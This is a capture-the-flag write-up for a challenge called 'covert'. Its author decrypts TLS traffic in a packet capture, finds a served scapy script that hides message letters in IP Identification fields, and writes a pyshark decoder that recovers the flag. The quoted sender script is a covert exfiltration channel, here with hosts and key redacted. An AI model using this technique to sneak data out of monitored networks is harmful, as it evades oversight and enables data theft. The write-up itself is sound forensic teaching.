# covert
>It appears there's been some shady communication going on in our network...

## Tools Used
- Wireshark
- python3

## Method
To start, we're given a pcap(ng) file and a keys.log file, so that should tell us we're gonna be fiddling with Wireshark. 

Opening up Wireshark, we see a lot of TLS packets and not a lot of HTTP so we configure the keys.log file in our Wireshark settings to decrypt this TLS for us. Now the beautiful greens of the HTTP packets are visible! 

Filtering to HTTP packets (of which there are only 6), we spot something interesting; looks like 172.20.10.5 was served a sneakly little python script

![image](https://github.com/user-attachments/assets/0d268e2e-b0c6-4c5d-b68b-a5c8c42cab79)


```python3
from scapy.all import IP, TCP, send
key = ??
dst_ip = "X.X.X.X"
dst_port = ?????
src_ip = "X.X.X.X"
src_port = ?????
def encode_message(message):
    for letter in message:
        ip = IP(dst=dst_ip, src=src_ip, id=ord(letter)*key)
        tcp = TCP(sport=src_port, dport=dst_port)
        send(ip/tcp)
encode_message("????????????")
```

The same host is also browsing (over HTTP2) a firstmonday.org article about Covert channels in the TCP/IP protocol suite (hmm I wonder what this challenge will be about)

We now know to be suspicious of 172.20.10.5's requests over TCP, and if they're using the python script they fetched previously, they're utilizing a 2-digit key to encode their secret messages in the IP section of the TCP packet. The encoding takes a single letter of their message, converts it to decimal, and multiplies it by said key.

The next thing to do is to start snooping around 172.20.10.5's TCP connections and pay extra attention to the IP header contents

![Peek 2024-09-20 02-26](https://github.com/user-attachments/assets/ee704806-84af-4299-9607-5ca6f005c980)

Ain't that strange... Looks like there's something going on with the Identification field. Let's analyze this bad boy in Python and see what happens

```python3
import pyshark

def IPidTCPCovertChannel(packets_of_interest: list[int], flag_format: str, keylog_file: str=None) -> str:
    if keylog_file:
        cap = pyshark.FileCapture("chall.pcapng", override_prefs={"ssl.keylog_file": keylog_file})
    else:
        cap = pyshark.FileCapture("chall.pcapng")

    ip_ids_hex = []
    for idx in packets_of_interest:
        try:
            ip_ids_hex.append(cap[idx].ip.id)
        except AttributeError:
            pass

    #assuming this will give us the flag outright, we know it starts with csaw{ and ends with }
    str_ = ""
    for idx in range(len(ip_ids_hex)):
        #convert hex str ip_id_hex to decimal number ip_id_dec
        ip_id_dec = int(ip_ids_hex[idx], 16)
        #0 is divisible by everything and if we let a zero pass, we're gonna get a divide by zero error, so let's ignore naughty zeros
        if not ip_id_dec: continue
        #we're working with factors of idx, ensure that ip_id is divisible by idx
        if ip_id_dec % ord(flag_format[0]) == 0:
            key = ip_id_dec // ord(flag_format[0])
            if chr(ip_id_dec // key) == flag_format[0]: break
            #TODO may want to store all potentially valid keys in an array in case of false positives

    for idx in range(idx, len(ip_ids_hex)):
        str_ += chr(int(ip_ids_hex[idx], 16) // key)
        if str_[-1] == "}": break

    print(str_)

    return str_

if __name__ == "__main__":
    packets_of_interest = list(range(256, 306))
    flag_format = "csawctf{"
    keylog_file = "keys.log"
    flag = IPidTCPCovertChannel(packets_of_interest, flag_format, keylog_file=keylog_file)
```

Since we know the flag should start with 'c' (decimal 99), we can go letter by letter, checking if our encoded characters are divisible by 99 and, if so, check if the ASCII representation of said division is the character 'c'. If the previous conditions are true, it's probably our flag. 

And just like magic, after running the script, we get: csawctf{licen$e_t0_tr@nsmit_c0vertTCP$$$}

